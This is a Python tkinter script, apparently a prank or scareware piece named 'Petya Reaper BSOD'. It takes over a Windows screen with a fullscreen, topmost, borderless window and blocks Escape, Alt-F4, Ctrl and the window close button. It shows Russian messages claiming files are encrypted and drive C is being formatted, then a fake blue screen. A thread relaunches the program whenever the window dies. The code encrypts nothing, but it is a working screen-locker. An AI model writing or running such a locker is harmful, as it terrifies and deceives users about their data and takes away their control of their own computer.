import tkinter as tk
import random
import ctypes
import threading
import time
import subprocess
import sys
import os

# ============================================
# P E T Y A   R E A P E R   B S O D
# ============================================

W, H = None, None
format_percent = 0
time_left = 30
bsod_mode = False
bsod_timer = 0
exe_path = sys.argv[0]

def self_replicate():
    while True:
        time.sleep(0.5)
        try:
            root.update()
        except:
            subprocess.Popen([exe_path], shell=True)
            os._exit(0)

def draw_bsod(canvas):
    global bsod_timer
    canvas.create_rectangle(0, 0, W, H, fill="#1073c2", outline="")
    canvas.create_text(W//2, H//2 - 150, text=":(", fill="white", font=("Segoe UI", 120))
    canvas.create_text(W//2, H//2, text="У ВАШЕЙ СИСТЕМЫ ВОЗНИКЛА ПРОБЛЕМА", fill="white", font=("Segoe UI", 28, "bold"))
    canvas.create_text(W//2, H//2 + 60, text="СКОРО ОНА БУДЕТ ПЕРЕЗАГРУЖЕНА.", fill="white", font=("Segoe UI", 20))
    
    error_codes = [
        "REAPER_SOUL_0xDEADBEEF",
        "PETYA_BLUE_0x8007054D",
        "CRITICAL_PROCESS_DIED",
        "PAGE_FAULT_IN_NONPAGED_AREA",
        "KMODE_EXCEPTION_NOT_HANDLED"
    ]
    canvas.create_text(W//2, H//2 + 130, text=f"КОД ОШИБКИ: {random.choice(error_codes)}", 
                      fill="white", font=("Consolas", 16))
    
    qr_x, qr_y = W//2 - 120, H//2 + 180
    canvas.create_rectangle(qr_x, qr_y, qr_x+80, qr_y+80, fill="black", outline="white", width=2)
    for _ in range(200):
        x = qr_x + random.randint(5, 75)
        y = qr_y + random.randint(5, 75)
        canvas.create_rectangle(x-2, y-2, x+2, y+2, fill="white", outline="")
    
    canvas.create_text(qr_x + 140, qr_y + 40, text="СЧИТАЙТЕ QR-КОД\nПРОКЛЯТИЕ ДУШИ", 
                      fill="white", font=("Segoe UI", 16), anchor="w")
    
    canvas.create_text(W//2, H - 100, text="⚠️  ТЕБЯ ЗАМЕТИЛИ. ОН В СИСТЕМЕ.  ⚠️", 
                      fill="#ffcccc", font=("Arial", 24, "bold"))
    canvas.create_text(W//2, H - 50, text="ТОЛЬКО ПЕРЕЗАГРУЗКА ОСТАНОВИТ ЭТО", 
                      fill="white", font=("Arial", 18))
    
    for _ in range(50):
        canvas.create_text(random.randint(0, W), random.randint(0, H), 
                         text=random.choice(["◉", "⬤", "@"]), fill="#a0d0ff", 
                         font=("Courier", random.randint(12, 20)))
    ctypes.windll.kernel32.Beep(200, 30)

def draw_skull(canvas, cx, cy):
    canvas.create_oval(cx-70, cy-70, cx+70, cy+50, fill="black", outline="red", width=3)
    canvas.create_oval(cx-40, cy-40, cx-10, cy-10, fill="black", outline="red", width=3)
    canvas.create_oval(cx+10, cy-40, cx+40, cy-10, fill="black", outline="red", width=3)
    canvas.create_oval(cx-35, cy-35, cx-15, cy-15, fill="red", outline="yellow")
    canvas.create_oval(cx+15, cy-35, cx+35, cy-15, fill="red", outline="yellow")
    canvas.create_polygon(cx-10, cy-5, cx+10, cy-5, cx, cy+15, fill="darkred", outline="red")
    for i in range(6):
        canvas.create_rectangle(cx-25 + i*10, cy+20, cx-20 + i*10, cy+35, fill="white", outline="gray")
    canvas.create_line(cx-30, cy-90, cx+30, cy-90, fill="red", width=5)
    canvas.create_line(cx, cy-120, cx, cy-60, fill="red", width=5)
    canvas.create_text(cx, cy-140, text="[ ! ] SYSTEM ERROR", fill="red", font=("Arial", 20, "bold"))

def create_reaper(canvas, cx, cy):
    canvas.create_polygon(cx-80, cy+60, cx+80, cy+60, cx+60, cy-20, cx-60, cy-20, fill="black", outline="darkred", width=2)
    canvas.create_oval(cx-45, cy-80, cx+45, cy+20, fill="black", outline="darkred", width=3)
    canvas.create_oval(cx-20, cy-40, cx+20, cy, fill="#050505", outline="darkred", width=2)
    canvas.create_oval(cx-25, cy-35, cx-10, cy-20, fill="red", outline="yellow")
    canvas.create_oval(cx+10, cy-35, cx+25, cy-20, fill="red", outline="yellow")
    canvas.create_oval(cx-22, cy-32, cx-13, cy-23, fill="black")
    canvas.create_oval(cx+13, cy-32, cx+22, cy-23, fill="black")
    canvas.create_line(cx+30, cy-20, cx+150, cy-120, fill="brown", width=8)
    canvas.create_line(cx+30, cy-20, cx+150, cy-120, fill="saddlebrown", width=4)
    canvas.create_polygon(cx+150, cy-120, cx+190, cy-160, cx+210, cy-140, cx+170, cy-100, fill="silver", outline="white", width=2)

def update_timer():
    global time_left, format_percent, bsod_timer, bsod_mode
    while True:
        time.sleep(0.3)
        if not bsod_mode:
            time_left -= 0.3
            format_percent = min(100, format_percent + random.randint(1, 2))
        bsod_timer += 0.3
        if bsod_timer > 10 and not bsod_mode:
            bsod_mode = True

def glitch():
    global format_percent, time_left, bsod_mode, bsod_timer
    canvas.delete("all")
    
    if bsod_mode:
        draw_bsod(canvas)
    else:
        canvas.create_rectangle(0, 0, W, H, fill="black", outline="")
        draw_skull(canvas, 200, 200)
        
        cx, cy = W//2, H//2 - 50
        canvas.create_rectangle(cx-350, cy-150, cx+350, cy+250, fill="#0a0a0a", outline="red", width=4)
        canvas.create_text(cx, cy-110, text="⚠️  СИСТЕМА ЗАБЛОКИРОВАНА  ⚠️", fill="red", font=("Arial", 32, "bold"))
        canvas.create_text(cx, cy-60, text="PETYA RANSOMWARE", fill="yellow", font=("Arial", 24, "bold"))
        canvas.create_text(cx, cy-30, text="ВАШИ ФАЙЛЫ ЗАШИФРОВАНЫ", fill="yellow", font=("Arial", 20))
        canvas.create_text(cx, cy+10, text="⚠️  ТЕБЯ ЗАМЕТИЛИ. ОН ПРИШЁЛ.  ⚠️", fill="red", font=("Arial", 26, "bold"))
        
        canvas.create_text(cx-250, cy+70, text=f"ФОРМАТИРОВАНИЕ: C:\\ [{int(format_percent)}%]", fill="white", font=("Courier", 18), anchor="w")
        bar_x, bar_y = cx-250, cy+100
        canvas.create_rectangle(bar_x, bar_y, bar_x+500, bar_y+25, outline="gray", fill="#222222")
        canvas.create_rectangle(bar_x, bar_y, bar_x+int(500*(format_percent/100)), bar_y+25, fill="red")
        
        canvas.create_text(cx, cy+150, text=f"ДО СИНЕГО ЭКРАНА: {max(0, 10 - int(bsod_timer))} СЕК", fill="cyan", font=("Arial", 20))
        canvas.create_rectangle(cx-120, cy+190, cx+120, cy+240, outline="darkred", fill="#330000", width=3)
        canvas.create_text(cx, cy+215, text="РАЗБЛОКИРОВАТЬ (ФЕЙК)", fill="gray", font=("Arial", 16, "bold"))
        
        create_reaper(canvas, W-200, H-150)
        
        for _ in range(150):
            canvas.create_text(random.randint(0, W), random.randint(0, H), 
                             text=random.choice(["◉", "⬤", "@", "O"]), fill="darkred", 
                             font=("Courier", random.randint(12, 24)))
        
        for _ in range(30):
            canvas.create_text(random.randint(50, W-50), random.randint(50, H-50), 
                             text=random.choice(["ВЫХОДА НЕТ", "ОН СМОТРИТ", "ТВОЯ ДУША", "СЗАДИ", 
                                               "НЕ ОБОРАЧИВАЙСЯ", "ПРОЩАЙ", "СКОРО BSOD", "СИНИЙ ЭКРАН"]), 
                             fill="darkred", font=("Arial", 20))
        
        ctypes.windll.kernel32.Beep(random.randint(100, 300), 50)
    
    root.after(150, glitch)

# ============================================
root = tk.Tk()
W, H = root.winfo_screenwidth(), root.winfo_screenheight()
root.attributes("-fullscreen", True, "-topmost", True)
root.configure(bg="black")
root.overrideredirect(True)

for key in ["<Escape>", "<Alt-F4>", "<Control>", "<Alt>", "<F4>", 
            "<Control-c>", "<Control-x>", "<Control-w>", "<Alt-Tab>"]:
    root.bind(key, lambda e: None)

root.protocol("WM_DELETE_WINDOW", lambda: None)

canvas = tk.Canvas(root, width=W, height=H, highlightthickness=0, bg="black")
canvas.pack()

threading.Thread(target=self_replicate, daemon=True).start()
threading.Thread(target=update_timer, daemon=True).start()

glitch()
root.mainloop()